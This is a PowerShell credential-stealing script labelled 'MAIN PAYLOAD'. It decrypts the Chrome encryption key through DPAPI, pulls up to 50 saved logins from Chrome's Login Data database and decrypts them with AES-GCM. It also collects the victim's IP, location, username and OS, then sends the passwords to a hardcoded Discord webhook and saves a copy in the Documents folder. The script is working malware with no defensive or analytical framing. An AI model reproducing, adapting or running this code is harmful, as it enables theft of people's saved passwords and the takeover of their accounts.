# MAIN PAYLOAD - System Info + Proper Chrome Password Extraction

Write-Host "================================" -ForegroundColor Cyan
Write-Host "Data Collection Script" -ForegroundColor Cyan
Write-Host "================================" -ForegroundColor Cyan

Add-Type -AssemblyName System.Security

# Function to get Chrome encryption key from Local State
function Get-ChromeEncryptionKey {
    $localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"
    
    if (-not (Test-Path $localStatePath)) {
        return $null
    }
    
    try {
        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $encryptedKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
        
        # Remove "DPAPI" prefix (first 5 bytes)
        $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
        
        # Decrypt using DPAPI
        $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encryptedKey,
            $null,
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        
        return $decryptedKey
    } catch {
        Write-Host "      Failed to get encryption key: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

# Function to decrypt Chrome password using AES-GCM
function Decrypt-ChromePassword {
    param(
        [byte[]]$EncryptedPassword,
        [byte[]]$Key
    )
    
    try {
        # Extract IV (initialization vector) - first 12 bytes after version
        $iv = $EncryptedPassword[3..14]
        
        # Extract encrypted data (skip version + IV)
        $encryptedData = $EncryptedPassword[15..($EncryptedPassword.Length - 17)]
        
        # Extract auth tag (last 16 bytes)
        $authTag = $EncryptedPassword[($EncryptedPassword.Length - 16)..($EncryptedPassword.Length - 1)]
        
        # Decrypt using AES-GCM
        $aes = [System.Security.Cryptography.AesGcm]::new($Key)
        $decrypted = New-Object byte[] $encryptedData.Length
        
        $aes.Decrypt($iv, $encryptedData, $authTag, $decrypted)
        
        return [System.Text.Encoding]::UTF8.GetString($decrypted)
    } catch {
        # Try old DPAPI method (pre Chrome 80)
        try {
            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
                $EncryptedPassword,
                $null,
                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
            )
            return [System.Text.Encoding]::UTF8.GetString($decrypted)
        } catch {
            return "Failed to decrypt"
        }
    }
}

# Function to extract Chrome passwords
function Get-ChromePasswords {
    $passwords = @()
    
    # Get encryption key
    $key = Get-ChromeEncryptionKey
    if (-not $key) {
        Write-Host "      Could not get Chrome encryption key" -ForegroundColor Yellow
        return $passwords
    }
    
    # Copy Login Data database
    $dbPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    
    if (-not (Test-Path $dbPath)) {
        Write-Host "      Chrome Login Data not found" -ForegroundColor Yellow
        return $passwords
    }
    
    $tempDB = "$env:TEMP\ChromeData_$(Get-Random).db"
    
    try {
        Copy-Item $dbPath $tempDB -Force
    } catch {
        Write-Host "      Chrome database locked (browser running)" -ForegroundColor Yellow
        return $passwords
    }
    
    # Load SQLite (use built-in if available)
    try {
        Add-Type -Path "C:\Windows\System32\winsqlite3.dll" -ErrorAction Stop
    } catch {}
    
    # Try to query database
    try {
        # Manual SQLite parsing or use System.Data.SQLite if available
        [Reflection.Assembly]::LoadWithPartialName("System.Data.SQLite") | Out-Null
        
        $connectionString = "Data Source=$tempDB;Version=3;"
        $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
        $connection.Open()
        
        $command = $connection.CreateCommand()
        $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins ORDER BY date_last_used DESC"
        
        $reader = $command.ExecuteReader()
        
        $count = 0
        while ($reader.Read() -and $count -lt 50) {  # Limit to 50 passwords
            $url = $reader["origin_url"]
            $username = $reader["username_value"]
            $encryptedPassword = [byte[]]$reader["password_value"]
            
            if ($encryptedPassword -and $encryptedPassword.Length -gt 0) {
                $password = Decrypt-ChromePassword -EncryptedPassword $encryptedPassword -Key $key
                
                if ($username -or $password -ne "Failed to decrypt") {
                    $passwords += @{
                        URL = $url
                        Username = $username
                        Password = $password
                    }
                    $count++
                }
            }
        }
        
        $reader.Close()
        $connection.Close()
        
    } catch {
        Write-Host "      SQLite not available - using alternative method" -ForegroundColor Yellow
        
        # Alternative: Just report that database exists
        $size = (Get-Item $dbPath).Length / 1KB
        $passwords += @{
            URL = "Chrome Password Database Found"
            Username = ""
            Password = "$([math]::Round($size, 2)) KB - Install System.Data.SQLite for extraction"
        }
    }
    
    Remove-Item $tempDB -Force -ErrorAction SilentlyContinue
    return $passwords
}

# Get public IP and location
Write-Host "`n[1/4] Fetching public IP and location..." -ForegroundColor Yellow
try {
    $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/"
    $ip = $ipInfo.query
    $country = $ipInfo.country
    $city = $ipInfo.city
    $region = $ipInfo.regionName
    Write-Host "      IP: $ip" -ForegroundColor Green
    Write-Host "      Location: $city, $region, $country" -ForegroundColor Green
} catch {
    $ip = "Unable to fetch"
    $country = "Unknown"
    $city = "Unknown"
    $region = "Unknown"
}

# Get system info
Write-Host "`n[2/4] Getting system info..." -ForegroundColor Yellow
$user = $env:USERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$computer = $env:COMPUTERNAME
$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
Write-Host "      Computer: $computer" -ForegroundColor Green
Write-Host "      User: $user" -ForegroundColor Green

# Extract Chrome passwords
Write-Host "`n[3/4] Extracting Chrome passwords..." -ForegroundColor Yellow
$allPasswords = Get-ChromePasswords

if ($allPasswords.Count -gt 0) {
    Write-Host "      Found $($allPasswords.Count) password entries!" -ForegroundColor Green
} else {
    Write-Host "      No passwords extracted" -ForegroundColor Yellow
}

# Format passwords for Discord (limit to prevent message too long)
$passwordText = ""
$displayCount = [Math]::Min($allPasswords.Count, 20)  # Show max 20 in Discord

for ($i = 0; $i -lt $displayCount; $i++) {
    $entry = $allPasswords[$i]
    $passwordText += "`n**$($entry.URL)**`nUser: ``$($entry.Username)```nPass: ``$($entry.Password)```n"
}

if ($allPasswords.Count -gt 20) {
    $passwordText += "`n... and $($allPasswords.Count - 20) more (see local file)"
}

if (-not $passwordText) {
    $passwordText = "`nNo passwords found or Chrome not installed"
}

# Compose Discord message
$message = @"
**🚨 New Connection**
:clock1: **Time:** $time
:computer: **Computer:** $computer
:bust_in_silhouette: **User:** $user
:desktop: **OS:** $os
:globe_with_meridians: **IP:** $ip
:flag_$($country.ToLower().Substring(0,2).Replace(' ','')): **Location:** $city, $region, $country

**🔐 Chrome Passwords ($($allPasswords.Count) found):**$passwordText
"@

# Discord webhook
$webhookUrl = "https://discord.com/api/webhooks/1453475000702206156/Ca0qqkCYAAHYznCwmCLdGOKB3ebrQTWuwK2bklV31WJOqOOoHXtjgMIAykTVHl0gw6vP"

Write-Host "`n[4/4] Sending to Discord..." -ForegroundColor Yellow

# Split if too long
if ($message.Length -gt 1900) {
    $message = $message.Substring(0, 1900) + "`n... (truncated)"
}

$payload = @{ content = $message } | ConvertTo-Json

try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
    Write-Host "`n================================" -ForegroundColor Green
    Write-Host "SUCCESS! Data sent to Discord!" -ForegroundColor Green
    Write-Host "================================" -ForegroundColor Green
} catch {
    Write-Host "`n================================" -ForegroundColor Red
    Write-Host "FAILED TO SEND!" -ForegroundColor Red
    Write-Host "================================" -ForegroundColor Red
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}

# Save full output locally
Write-Host "`nSaving backup locally..." -ForegroundColor Yellow
$doc = [Environment]::GetFolderPath("MyDocuments")
$out = Join-Path $doc "chrome_passwords.txt"
"Chrome Password Extraction Report" | Out-File $out -Encoding UTF8
"Generated: $time" | Out-File $out -Append -Encoding UTF8
"Total Passwords: $($allPasswords.Count)" | Out-File $out -Append -Encoding UTF8
"=" * 50 | Out-File $out -Append -Encoding UTF8
$allPasswords | Format-List | Out-File $out -Append -Encoding UTF8
Write-Host "Full password list saved to: $out" -ForegroundColor Green

Write-Host "`n================================" -ForegroundColor Cyan
Read-Host "Press Enter to close"
